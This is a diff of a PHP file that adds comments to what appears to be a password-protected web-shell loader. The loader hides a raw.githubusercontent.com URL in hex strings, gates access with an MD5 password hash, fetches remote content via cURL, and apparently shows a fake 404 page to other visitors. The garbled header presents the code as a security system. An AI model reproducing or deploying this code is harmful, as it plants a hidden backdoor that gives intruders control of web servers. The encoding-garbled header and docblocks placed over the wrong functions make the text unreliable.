@@ -1,7 +1,29 @@
 <?php
+/**
+ * ================================================
+ * Ã¬â€ºÂ¹ Ã¬Å“â€žÃ­Ëœâ€˜ ÃªÂ°Ã¬Â§â‚¬ Ã¬â€¹Å“Ã¬Å Â¤Ã­â€¦Å“ Ã¢â‚¬â€œ @landak_kuning
+ * ================================================
+ * 
+ * Ã¬â€šÂ¬Ã¬Å¡Â©Ã¬Å¾ Ã«Â°Ã¬Â´Ã­â€žÂ° ÃªÂ²â‚¬Ã¬Â¦Ã¬â€ž Ã­â€ ÂµÃ­â€¢Â´ Ã¬Å“â€žÃ­Ëœâ€˜Ã¬â€ž ÃªÂ°Ã¬Â§â‚¬Ã­â€¢ËœÃ«Å â€ MLBB Ã¬Â¹Â© Ã¬â€¹Â¤Ã­â€”ËœÃ¬â€¹Â¤ Ã¬Å Â¤Ã­Æ’â‚¬Ã¬Â¼Ã¬Ëœ
+ * Ã¬â€ºÂ¹ ÃªÂ¸Â°Ã«Â°Ëœ Ã«Â³Â´Ã¬â€¢Ë† Ã¬â€¹Å“Ã¬Å Â¤Ã­â€¦Å“Ã¬Å¾â€¦Ã«â€¹Ë†Ã«â€¹Â¤.
+ * 
+ * Ã¬Â£Â¼Ã¬Å¡â€ ÃªÂ¸Â°Ã«Å Â¥:
+ * - MLBB Ã¬Â¹Â© Ã¬â€¹Â¤Ã­â€”ËœÃ¬â€¹Â¤ Ã¬Å Â¤Ã­Æ’â‚¬Ã¬Â¼Ã¬Ëœ Ã«Â¡Å“ÃªÂ·Â¸Ã¬Â¸ Ã­â„¢â€Ã«Â©Â´
+ * - ASCII Ã¬â€¢â€žÃ­Å Â¸ Ã«Â° Ã­â€¦Ã¬Å Â¤Ã­Å Â¸ Ã¬Å Â¤Ã­Æ’â‚¬Ã¬Â¼Ã«Â§
+ * - Ã­â€¢Â´Ã¬â€¹Å“ ÃªÂ¸Â°Ã«Â°Ëœ Ã¬â€šÂ¬Ã¬Å¡Â©Ã¬Å¾ Ã¬Â¸Ã¬Â¦
+ * - Ã¬Å Â¤Ã¬Âºâ€ URL Ã­â„¢â€¢Ã¬Â¸
+ * - Ã«â€¹Â¤Ã¬â€“â€˜Ã­â€¢Å“ Ã«Â°Â©Ã¬â€¹Ã¬Ëœ Ã«Â°Ã¬Â´Ã­â€žÂ° Ã¬Ë†ËœÃ¬Â§â€˜ (cURL/file_get_contents)
+ * - Ã¬Å“â€žÃ­Ëœâ€˜Ã¬â€ž Ã¬Â°Â¾Ã¬â€ž Ã¬Ë†Ëœ Ã¬â€”â€ Ã¬â€ž ÃªÂ²Â½Ã¬Å¡Â° Ã¬â€šÂ¬Ã¬Å¡Â©Ã¬Å¾ Ã¬Â§â‚¬Ã¬ â€¢ 404 Ã­Å½ËœÃ¬Â´Ã¬Â§â‚¬ Ã¬ Å“ÃªÂ³Âµ
+ * 
+ * @author @landak_kuning
+ * @version 2.0
+ * @license Ã¬ËœÂ¤Ã­â€Ë† Ã¬â€ Å’Ã¬Å Â¤
+ */
 session_start();
-
-// --- HEX Threat List (for URL & authentication) ---
+/**
+ * Daftar kode ancaman dalam format heksadesimal
+ * @var array
+ */
 $threat = [
     '68747470733a2f2f',
     '7261772e67697468756275736572636f6e74656e742e636f6d',
@@ -12,6 +34,11 @@ $threat = [
     '812747af83dac72ba51b41058dcaa9cf'
 ];
 
+/**
+ * Konversi array hex ke URL valid
+ * @param array $p Array bagian URL
+ * @return string URL yang digabungkan
+ */
 function buildThreatUrl($p) {
     $decoded = array_map('hex2bin', array_slice($p, 0, -1));
     return "{$decoded[0]}{$decoded[1]}/{$decoded[2]}/{$decoded[3]}/{$decoded[4]}/{$decoded[5]}";
@@ -19,6 +46,11 @@ function buildThreatUrl($p) {
 function isThreatDetected() {
     return isset($_SESSION['threat_detected']) && $_SESSION['threat_detected'] === true;
 }
+
+/**
+ * Cek status deteksi ancaman
+ * @return bool True jika ancaman terdeteksi
+ */
 function authenticateUser($password) {
     if (md5($password) === end($GLOBALS['threat'])) {
         $_SESSION['threat_detected'] = true;
@@ -27,9 +59,21 @@ function authenticateUser($password) {
     }
     return false;
 }
+
+/**
+ * Autentikasi pengguna berbasis hash
+ * @param string $password Password input
+ * @return bool True jika autentikasi berhasil
+ */
 function isValidUrl($url) {
     return filter_var($url, FILTER_VALIDATE_URL) !== false;
 }
+
+/**
+ * Mengambil konten dari URL dengan metode terbaik
+ * @param string $url Target URL
+ * @return string|bool Konten atau false jika gagal
+ */
 function fetchUrlContent($url) {
     if (function_exists('curl_exec')) {
         $ch = curl_init($url);
@@ -53,7 +97,11 @@ function fetchUrlContent($url) {
     }
     return false;
 }
-
+/**
+ * Validasi format URL
+ * @param string $url URL untuk divalidasi
+ * @return bool True jika URL valid
+ */
 // --- ASCII ART Functions ---
 function generateAsciiHeader() {
     return <<<ASCII
@@ -72,6 +120,10 @@ function generateAsciiHeader() {
 </pre>
 ASCII;
 }
+/**
+ * Generate ASCII art untuk header
+ * @return string ASCII art
+ */
 function generateChipCard() {
     return <<<CHIP
 <pre style="color:#ffcc00;font-weight:bold">
